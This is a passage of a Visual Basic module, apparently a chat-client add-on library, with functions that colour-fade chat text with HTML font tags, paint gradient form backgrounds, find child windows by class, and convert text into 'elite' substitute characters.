BoldSendChat (Msg)
End Function

Function BoldYellowBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldYellowBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldYellowGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldYellowPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldYellowRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


'Pre-set 3 Color fade combinations begin here


Function BoldBlackBlueBlack2(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><U><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function
Function BoldBlackBlueBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function
Function BoldBlackGreenBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlackGreyBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function Bolditalic_BlackPurpleBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldBlackRedBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlackYellowBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlueBlackBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlueGreenBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function Bolditalic_BluePurpleBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
 SendChat (Msg)
End Function

Function BoldBlueRedBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlueYellowBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldGreenBlackGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function

Function BoldGreenBlueGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function BoldGreenPurpleGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function

Function BoldGreenRedGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function BoldGreenYellowGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function

Function BoldGreyBlackGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyBlueGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldGreyGreenGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyPurpleGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyRedGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyYellowGrey(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldPurpleBlackPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleBluePurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreenPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldPurpleRedPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldPurpleYellowPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function RedBlackRed2(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><U><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function
Function BoldRedBlackRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function
Function BoldRedBlueRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldRedGreenRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldRedPurpleRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldRedYellowRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldYellowBlackYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldYellowBlueYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldYellowGreenYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldYellowPurpleYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldYellowRedYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


'Preset 2-3 color fade hexcode generator


Function RGBtoHEX(RGB)
    A = Hex(RGB)
    B = Len(A)
    If B = 5 Then A = "0" & A
    If B = 4 Then A = "00" & A
    If B = 3 Then A = "000" & A
    If B = 2 Then A = "0000" & A
    If B = 1 Then A = "00000" & A
    RGBtoHEX = A
End Function


'Form back color fade codes begin here
'Works best when used in the Form_Paint() sub


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub


'Variable color fade functions begin here


Function TwoColors(text, Red1, Green1, Blue1, Red2, Green2, Blue2, WavY As Boolean)
    C1BAK = c1
    C2BAK = c2
    C3BAK = c3
    C4BAK = c4
    c = 0
    o = 0
    o2 = 0
    Q = 1
    Q2 = 1
    For X = 1 To Len(text)
        BVAL1 = Red2 - Red1
        BVAL2 = Green2 - Green1
        BVAL3 = Blue2 - Blue1
        
        VAL1 = (BVAL1 / Len(text) * X) + Red1
        VAL2 = (BVAL2 / Len(text) * X) + Green1
        VAL3 = (BVAL3 / Len(text) * X) + Blue1
        
        c1 = RGB2HEX(VAL1, VAL2, VAL3)
        c2 = RGB2HEX(VAL1, VAL2, VAL3)
        c3 = RGB2HEX(VAL1, VAL2, VAL3)
        c4 = RGB2HEX(VAL1, VAL2, VAL3)
        
        If c1 = c2 And c2 = c3 And c3 = c4 And c4 = c1 Then c = 1: Msg = Msg & "<FONT COLOR=#" + c1 + ">"
        If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
        
        If c <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        
        If WavY = True Then
            If o2 = 1 Then Msg = Msg + "<SUB>"
            If o2 = 3 Then Msg = Msg + "<SUP>"
            Msg = Msg + Mid$(text, X, 1)
            If o2 = 1 Then Msg = Msg + "</SUB>"
            If o2 = 3 Then Msg = Msg + "</SUP>"
            If Q2 = 2 Then
                Q = 1
                Q2 = 1
                If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
                If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
                If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
                If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
            End If
        ElseIf WavY = False Then
            Msg = Msg + Mid$(text, X, 1)
            If Q2 = 2 Then
            Q = 1
            Q2 = 1
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        End If
nc:     Next X
    c1 = C1BAK
    c2 = C2BAK
    c3 = C3BAK
    c4 = C4BAK
    BoldSendChat (Msg)
End Function

Function ThreeColors(text As String, Red1, Green1, Blue1, Red2, Green2, Blue2, Red3, Green3, Blue3, WavY As Boolean)

'This code is still buggy, use at your own risk

    D = Len(text)
        If D = 0 Then GoTo TheEnd
        If D = 1 Then Fade1 = text
    For X = 2 To 500 Step 2
        If D = X Then GoTo Evens
    Next X
    For X = 3 To 501 Step 2
        If D = X Then GoTo Odds
    Next X
Evens:
    c = D \ 2
    Fade1 = Left(text, c)
    Fade2 = Right(text, c)
    GoTo TheEnd
Odds:
    c = D \ 2
    Fade1 = Left(text, c)
    Fade2 = Right(text, c + 1)
TheEnd:
    LA1 = Fade1
    LA2 = Fade2
        If WavY = True Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, True) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, True)
        If WavY = False Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, False) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, False)
        If WavY = True Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, True) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, True)
        If WavY = False Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, False) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, False)
    Msg = FadeA + FadeB
  BoldSendChat (Msg)
End Function

Function RGB2HEX(R, G, B)
    Dim X&
    Dim xx&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = B
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = R
        For xx& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next xx&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function

Function TrimSpaces(text)
    If InStr(text, " ") = 0 Then
    TrimSpaces = text
    Exit Function
    End If
    For TrimSpace = 1 To Len(text)
    thechar$ = Mid(text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function


Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
Room% = firs%
FindChildByClass = Room%

End Function
Function Bold_italic_colorR_Backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextchr$ & newsent$
Loop
BoldRedBlackRed (newsent$)
End Function


Function R_Elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function

Function R_Elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
